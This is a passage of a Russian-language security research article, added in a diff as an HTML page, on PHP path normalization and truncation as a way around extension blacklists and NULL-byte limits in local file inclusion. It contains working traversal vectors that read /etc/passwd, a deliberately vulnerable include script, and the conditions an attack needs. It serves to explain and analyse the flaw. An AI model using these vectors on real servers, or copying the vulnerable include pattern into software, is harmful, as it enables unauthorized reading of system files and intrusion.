+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81ff-b7a2-d6e34697dda8" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+include(&#x27;/etc//passwd&#x27;); //работает
+include(&#x27;/etc///passwd&#x27;); //работает
+include(&#x27;/etc/./passwd&#x27;); //работает
+include(&#x27;/etc/passwd/.&#x27;); //работает
+include(&#x27;/etc/passwd/./.&#x27;); //работает
+?&gt;</code></pre>
+			<p id="131aa64c-9d0a-8149-902e-d47d4570be62" class="">Нормализация пути может быть использована атакующим
+				для обхода проверки расширения или имени файла в различных ситауциях, например при загрузке файлов или в
+				веб-приложении, реализующем преднамеренный просмотр своего исходного кода. Уязвимость имеет место при
+				неправильно реализованной проверке, которая основывается на принципе черного списка (blacklist), т.е.
+				веб-приложение сверяет данные со списком нежелательных значений. Например:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-817a-872f-f28e746d2874" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+$parts = pathinfo($_GET[&#x27;filename&#x27;]);
+$ext = $parts[&#x27;extension&#x27;];
+$blacklist = array(&#x27;php&#x27;, &#x27;phtml&#x27;, &#x27;php3&#x27;, &#x27;php4&#x27;, &#x27;php5&#x27;);
+if(in_array($ext, $blacklist)) {
+	die(&#x27;Invalid input&#x27;);
+}
+?&gt;</code></pre>
+			<p id="131aa64c-9d0a-819b-96ae-cda01cf086c0" class="">Если в filename передать значение
+				“<code>file.php</code>”, то проверка сработает успешно, но если же добавить к этому значению
+				“<code><strong>/.</strong></code>“, то <code>pathinfo()</code> вернет неверный массив, в котором элемент
+				“<code>dirname</code>” будет равен “<code>file.php</code>”.Причина уязвимости кроется в функции
+				<code>virtual_file_ex()</code> (TSRM/tsrm_virtual_cwd.c):</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81c4-98c4-e3db568a7065" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">tok=NULL;
+ptr = tsrm_strtok_r(path_copy, TOKENIZER_STRING, &amp;tok);
+while (ptr) {
+	ptr_length = strlen(ptr);
+	/* */
+	if (IS_DIRECTORY_UP(ptr, ptr_length)) {
+		/* */
+	} else if (!IS_DIRECTORY_CURRENT(ptr, ptr_length)) {
+		/* */
+	}
+	ptr = tsrm_strtok_r(NULL, TOKENIZER_STRING, &amp;tok);
+}</code></pre>
+			<p id="131aa64c-9d0a-819d-9a7e-f915b7d8a035" class="">Путь разбивается на части символом, значение которого
+				хранится в <code>TOKENIZER_STRING</code>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-819c-aa4c-e6a715afcd3b" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#define TOKENIZER_STRING &quot;/\\&quot; // Win32
+#define TOKENIZER_STRING &quot;/\\&quot; // NETWARE
+#define TOKENIZER_STRING &quot;/&quot; // other (*nix)</code></pre>
+			<p id="131aa64c-9d0a-81b8-8d10-e03b366b9e55" class="">Затем в цикле каждая часть проверяется на соответствие
+				с <code>IS_DIRECTORY_UP</code> и <code>IS_DIRECTORY_CURRENT</code>, значения которых определены так:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-818a-b33a-dd3a8487c4ed" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#define IS_DIRECTORY_UP(element, len) \
+    (len &gt;= 2 &amp;&amp; !php_check_dots(element, len))
+#define IS_DIRECTORY_CURRENT(element, len) \
+    (len == 1 &amp;&amp; element[0] == &#x27;.&#x27;)</code></pre>
+			<p id="131aa64c-9d0a-813c-afe8-fde622bee3e8" class="">Таким образом, каждая часть пути, разделенная на
+				<code>TOKENIZER_STRING</code>, анализируется в цикле с помощью нехитрых проверок, при чем ни одна из них
+				не вызывает ошибку, что в конечном счете приводит к уязвимости, так как все нейтральные
+				“<code>./</code>” убираются.Стоит отметить, что простая последовательность из символов “<code>/</code>”,
+				стоящая в конце пути, не приведет к желаемому результату, если используется “чистый” PHP без всяких
+				патчей. Однако PHP с <strong>Suhosin patch</strong> будет принимать такие значения:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81e9-bb42-d16d0d84db5f" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+include(&#x27;/etc/passwd///&#x27;);
+?&gt;</code></pre>
+			<p id="131aa64c-9d0a-813a-a555-fdfd1b5fc36e" class="">Все дело в том, что <strong>Suhosin patch</strong>
+				заменяет функцию <code>realpath()</code>, отсюда возникают расхождения. Патч полностью убирает
+				замыкающие символы “<code>/</code>”, в то время как стандартный PHP преобразует все дополнительные
+				символы “<code>/</code>” в один, что сделает имя файла неправильным. Тем не менее, одиночные символы
+				“<code>/</code>.” или их последовательность будут работать на любой установке PHP.</p>
+			<h3 id="131aa64c-9d0a-8107-8edb-c992e4b45c05" class="">Усечение пути</h3>
+			<p id="131aa64c-9d0a-81f2-92e6-c7c597394fe7" class="">Вторая особенность, позволяющая говорить о новой
+				уязвимости в PHP, – это автоматическое усечение длины пути подобно тому, как это происходит в MySQL с
+				ограниченными по длине колонками. Благодаря этому, в локальных инклудах NULL-байт может быть заменен на
+				последовательность символов, состоящих из “<code>/</code>”, “<code>./</code>”, “<code>/.</code>” и
+				других. Например имеется следующий уязвимый скрипт:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8112-afc0-ed3f4e3513fa" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?php
+// magic_quotes_gpc=on
+include(&#x27;includes/&#x27;.$_GET[&#x27;act&#x27;].&#x27;.php&#x27;);
+?&gt;</code></pre>
+			<p id="131aa64c-9d0a-81a2-8527-fcb72e49fca2" class="">Это классическая LFI-уязвимость. В данном примере
+				атакующий может изменять центральную часть аргумента функции <code>include()</code>, поэтому проведение
+				RFI (remote file include) является невозможным, так как для этого необходимо контролировать начало
+				значения для указания протокола передачи данных (http, ftp, data, etc). Для реализации локального
+				инклуда атакующий может внедрить произвольный PHP-код в файловую систему сервера для дальнейшего его
+				выполнения через LFI. При этом очень часто требуется отбросить расширение файла, что обычно достигается
+				путем использования NULL-байта. Как известно, многие функции PHP, в частности <code>ereg(i)_*</code>,
+				<code>include</code>, <code>require</code>, <code>etc</code> не являются бинарно безопасными, т.е. как и
+				в C/C++, NULL-байт будет интерпретироваться как конец строки. Использование NULL-байта затрудняется тем,
+				что включенная директива <code>magic_quotes_gpc</code>, а также применение функции
+				<code>addslashes()</code> экранируют нулевой символ, что существенно сокращает поле его применения.</p>
+			<p id="131aa64c-9d0a-81ad-b4e9-f69b652f9986" class="">Пример LFI-вектора с NULL-байтом:</p>
+			<p id="131aa64c-9d0a-815b-884d-d4fc2648df86" class="">
+				<code><strong>index.php?act=../../../../../etc/passwd%00</strong></code></p>
+			<p id="131aa64c-9d0a-8189-ad8d-e491e5647ee6" class="">После экранирования в <code>include()</code> попадет
+				значение “<strong>includes/../../../../../etc/passwd \0.php</strong>”.</p>
+			<p id="131aa64c-9d0a-8175-bbd9-c9bfcc593336" class="">Новый вектор способен предоставить полноценную
+				альтернативу NULL-байту:</p>
+			<p id="131aa64c-9d0a-810a-b3ed-fbdda374ed40" class="">
+				<code><strong>index.php?act=../../../../../etc/passwd/////[…]/////</strong></code></p>
+			<p id="131aa64c-9d0a-81be-b6e9-f59080d0f776" class="">Количество символов “<code>/</code>” отличается на
+				разных платформах, но в большинстве случаев максимальная длина полного пути (т.е. после преобразования
+				относительного в абсолютный путь) равна 4096 байт. Само усечение пути выполняется в
+				<strong>main/streams/plain_wrapper.c</strong> и <strong>main/fopen_wrappers.c</strong> неправильным
+				вызовом <code>snprintf()</code>:</p>
+			<p id="131aa64c-9d0a-8137-a1fc-c2062d33ecb8" class="">
+				<code><strong>snprintf(trypath, MAXPATHLEN, &quot;%s/%s&quot;, ptr, filename);</strong></code></p>
+			<p id="131aa64c-9d0a-8130-9df2-eb9a15037169" class="">Как и в MySQL, PHP без всяких вопросов и
+				предупреждений обрезает строку, длина которой становится равной MAXPATHLEN. Значение MAXPATHLEN
+				определяется так:<br /><br /><strong>/main/php.h</strong>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8121-b514-dd8efa8651e2" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#ifndef MAXPATHLEN
+# ifdef PATH_MAX
+# define MAXPATHLEN PATH_MAX
+# elif defined(MAX_PATH)
+# define MAXPATHLEN MAX_PATH
+# else
+# define MAXPATHLEN 256
+# endif
+#endif</code></pre>
+			<p id="131aa64c-9d0a-815b-9000-d7c5f9b5cdb5" class=""><strong>/win32/param.h</strong>:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81ff-9b7d-c2738775bcd6" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">#ifndef MAXPATHLEN
+# define MAXPATHLEN _MAX_PATH
+#endif</code></pre>
+			<p id="131aa64c-9d0a-819d-a992-cd25368db875" class="">Усечение пути в сочетании с нормализацией пути
+				позволяет заменить NULL-байт для установок PHP с включенным <strong>magic_quotes_gpc</strong>.
+				Последовательность после желаемого пути может состоять из символов “<code>/</code>”, “<code>/.</code>”,
+				“<code>./</code>”; в win32 этот список гораздо шире: <code>0x20</code> (пробел), <code>0x22</code> (“),
+				<code>0x2E</code> (.), <code>0x3c</code> (&lt;), <code>0x3e</code> (&gt;), <code>0x5c</code> (\).
+				Следует заметить, что в стандартных сборках PHP для удачной реализации уязвимости последним символом
+				пути должна быть точка. Что касается символа “<code>/</code>”, то его нормализация происходит на всех
+				платформах, но в стандартной сборке PHP последовательность из слэшей преобразуется в один, поэтому очень
+				часто его применение может быть невозможно. Однако по утверждениям Стефана Эссера использовать слэш в
+				атаках можно на любых *bsd платформах, даже без Suhosin patch. По собственным наблюдениям могу
+				предположить, что на всех *bsd-серверах длина последовательности составляет 1024 байта, в то время как
+				на linux эта цифра в четыре раза больше. В windows была замечена самая короткая последовательность – не
+				более 270 байт.</p>
+			<p id="131aa64c-9d0a-8158-8519-dd89521b15b5" class="">Угулублясь в исходный код PHP, становится очевиным,
+				что уязвимость обязана своему существованию такой директиве конфигурации PHP как
+				<strong>include_path</strong>, которая представляет собой аналог PATH на unix-системах. Всякий раз когда
+				вызывается <code>include()</code> или <code>require()</code> с относительным путем в качестве аргумента,
+				PHP производит попытки чтения файлов, последовательно подставляя папки, разделенных символов
+				“<code>:</code>”, из значения директивы. По умолчанию <code>include_path</code> равен “<code>.:</code>”,
+				но обычно в это значение добавляется еще несколько путей до различных библиотек, PEAR и прочего. В ходе
+				исследований команды <strong>USH</strong> выяснилось, что условием удачной атаки является наличие хотя
+				бы одного абсолютного пути в значении <strong>include_path</strong>.</p>
+			<h3 id="131aa64c-9d0a-8161-8e66-c3371ebd245d" class="">Итоги</h3>
+			<p id="131aa64c-9d0a-81f9-a173-c0e86d6a0101" class="">Особенности PHP при обработке путей позволяют выделить
+				новую уязвимость в популярном языке программирования веб-приложений. С помощью нее становится возможным
+				осуществление обхода запрещенных расширений или имен файлов. Кроме того, нормализация пути вкупе с
+				усечением дают новую альтернативу NULL-байту при проведении локальных инклудов. При этом универсальным
+				вектором атаки для *nix является последовательность из символов “<code>/.</code>”, а для windows –
+				“<code>.</code>”. Условия реализации атаки могут варьироваться в зависимости от конкретного сервера, в
+				частности от платформы и конфигурации PHP. Известными условиями являются:</p>
+			<ul id="131aa64c-9d0a-8166-ae50-f753ed2e4b88" class="bulleted-list">
+				<li style="list-style-type:disc">в стандартных сборках PHP последним символом пути должна быть точка
+				</li>
+			</ul>
+			<ul id="131aa64c-9d0a-81ae-9a2b-ede5b3733dac" class="bulleted-list">
+				<li style="list-style-type:disc">include_path должен содержать абсолютный путь</li>
+			</ul>
+			<ul id="131aa64c-9d0a-8145-832c-f1354ef351a1" class="bulleted-list">
+				<li style="list-style-type:disc">вектор атаки для метода GET должен умещаться в пределы максимальной
+					принимаемой веб-сервером длины URL</li>
+			</ul>
+		</div>
+	</article><span class="sans" style="font-size:14px;padding-top:2em"></span>
+</body>
+
+</html>
